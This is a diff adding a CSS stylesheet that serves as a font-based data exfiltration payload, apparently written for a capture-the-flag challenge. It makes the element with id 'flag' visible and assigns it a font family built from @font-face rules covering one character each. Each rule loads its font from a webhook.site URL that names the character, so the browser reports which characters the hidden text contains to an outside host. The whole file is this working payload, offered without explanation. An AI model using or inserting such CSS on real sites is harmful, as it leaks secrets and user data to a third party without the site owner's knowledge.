@@ -1,0 +1,15 @@
+#flag {
+  display: block !important;
+  visibility: visible !important;
+}
+
+@font-face { font-family: exfil; src: url(https://webhook.site/2a3a5680-c00a-40c5-b824-228946c821cf?c=a); unicode-range: U+0061; }
+@font-face { font-family: exfil; src: url(https://webhook.site/2a3a5680-c00a-40c5-b824-228946c821cf?c=b); unicode-range: U+0062; }
+@font-face { font-family: exfil; src: url(https://webhook.site/2a3a5680-c00a-40c5-b824-228946c821cf?c=c); unicode-range: U+0063; }
+@font-face { font-family: exfil; src: url(https://webhook.site/2a3a5680-c00a-40c5-b824-228946c821cf?c=0); unicode-range: U+0030; }
+@font-face { font-family: exfil; src: url(https://webhook.site/2a3a5680-c00a-40c5-b824-228946c821cf?c=1); unicode-range: U+0031; }
+@font-face { font-family: exfil; src: url(https://webhook.site/2a3a5680-c00a-40c5-b824-228946c821cf?c=underscore); unicode-range: U+005F; }
+@font-face { font-family: exfil; src: url(https://webhook.site/2a3a5680-c00a-40c5-b824-228946c821cf?c=open_brace); unicode-range: U+007B; }
+@font-face { font-family: exfil; src: url(https://webhook.site/2a3a5680-c00a-40c5-b824-228946c821cf/?c=close_brace); unicode-range: U+007D; }
+
+#flag { font-family: exfil; }
